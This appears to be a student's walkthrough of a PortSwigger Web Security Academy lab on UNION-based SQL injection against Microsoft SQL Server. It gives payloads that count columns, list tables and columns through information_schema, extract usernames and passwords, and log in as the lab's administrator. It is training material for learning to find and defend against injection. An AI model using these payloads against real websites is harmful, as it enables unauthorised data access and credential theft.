This lab is the **Microsoft SQL Server (MSSQL)** version of the UNION-based SQL injection exercise. Unlike the Oracle version (which uses `all_tables`, `all_tab_columns`, and `dual`), SQL Server exposes schema information through the `information_schema` views.

Below is a detailed explanation of each step for the **PortSwigger Web Security Academy lab**.

---

## Objective

The goal is to:

1. Determine the number of columns returned by the original query.
2. Identify which columns support text data.
3. Enumerate the database tables.
4. Find the table containing user credentials.
5. Enumerate the columns in that table.
6. Retrieve usernames and passwords.
7. Log in as the administrator.

---

# Step 1: Intercept the Request

1. Open **Burp Suite**.
2. Turn **Intercept ON**.
3. Browse to the vulnerable application.
4. Click any product category.
5. Burp captures a request similar to:

```
GET /filter?category=Gifts HTTP/2
Host: lab-id.web-security-academy.net
```

Send the request to **Repeater** (`Ctrl + R`).

---

# Step 2: Determine the Number of Columns and Text Columns

Inject the following payload into the `category` parameter:

```sql
'+UNION+SELECT+'abc','def'--
```

The SQL executed becomes similar to:

```sql
SELECT name, description
FROM products
WHERE category='Gifts'

UNION

SELECT
'abc',
'def'
```

### Explanation

- `UNION` combines the original query with the injected query.
- `'abc'` is returned in the first column.
- `'def'` is returned in the second column.

If **abc** and **def** appear on the page, it has confirmed:

- The original query returns **2 columns**.
- Both columns accept **text** values.

---

<img width="1277" height="771" alt="Screenshot 2026-08-04 at 2 07 19 PM" src="https://github.com/user-attachments/assets/8e780f2f-a386-4ae9-a585-be32a2934d2b" />


# Step 3: Retrieve All Table Names

SQL Server stores table metadata in the `information_schema.tables` view.

Use:

```sql
'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--
```

### SQL Explanation

```sql
UNION
SELECT
table_name,
NULL
FROM information_schema.tables
```

### What each part does

| Part | Purpose |
| --- | --- |
| `table_name` | Returns the name of each table. |
| `NULL` | Placeholder for the second column. |
| `information_schema.tables` | System view containing table metadata. |

---

<img width="1277" height="765" alt="Screenshot 2026-08-04 at 2 12 07 PM" src="https://github.com/user-attachments/assets/bad12393-de53-4e6e-bc52-4444e5cafb06" />

# Step 4: Retrieve the Column Names

After discovering the table name, enumerate its columns.

Example payload:

```sql
'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_xkqrmn'--
```

### SQL Explanation

```sql
UNION
SELECT
column_name,
NULL
FROM information_schema.columns
WHERE table_name='users_xkqrmn'
```

### What happens

`information_schema.columns` contains metadata about every column in every table.

Filtering with:

```sql
WHERE table_name='users_xkqrmn'
```

returns only the columns belonging to that table.

---

<img width="1278" height="738" alt="Screenshot 2026-08-04 at 2 14 02 PM" src="https://github.com/user-attachments/assets/293ba57e-88fd-496b-9fad-9e8770ff27cb" />


# Step 5: Retrieve the Credentials

Replace the placeholders with the discovered names:

```sql
'+UNION+SELECT+username_bvxt,password_jqnm+FROM+users_xkqrmn--
```

### SQL Executed

```sql
UNION
SELECT
username_bvxt,
password_jqnm
FROM users_xkqrmn
```

<img width="1277" height="738" alt="Screenshot 2026-08-04 at 2 15 25 PM" src="https://github.com/user-attachments/assets/cd6dd42c-611c-47ab-98d9-aef96c34ff06" />


# Step 6: Log In

Locate the administrator row:

```
Username:
administrator

Password:
p8fd3x7q
```

Go to **My Account** and log in with these credentials to complete the lab.

---

<img width="1277" height="725" alt="Screenshot 2026-08-04 at 2 15 38 PM" src="https://github.com/user-attachments/assets/47dce59a-2edc-4ae8-b16f-1e2f14ad4a34" />


# Why `NULL`?

The original query returns two columns.

The injected query must also return two columns.

For example:

Original query:

```sql
SELECT name, description
```

Injected query:

```sql
SELECT table_name, NULL
```

The `NULL` acts as a placeholder so that the number of returned columns matches the original query. It is commonly used because it is compatible with most data types.

---

# Why `information_schema`?

`information_schema` is a collection of standard SQL metadata views.

The most useful ones are:

| View | Purpose |
| --- | --- |
| `information_schema.tables` | Lists all tables in the database. |
| `information_schema.columns` | Lists all columns in all tables. |

These views allow to discover the database schema before retrieving actual data.

---

## Key Difference: Oracle vs. Microsoft SQL Server

| Task | Oracle | Microsoft SQL Server |
| --- | --- | --- |
| One-row table | `dual` | Not required |
| List tables | `all_tables` | `information_schema.tables` |
| List columns | `all_tab_columns` | `information_schema.columns` |
| String concatenation | `||` | `+` |
| Example metadata query | `SELECT table_name FROM all_tables` | `SELECT table_name FROM information_schema.tables` |
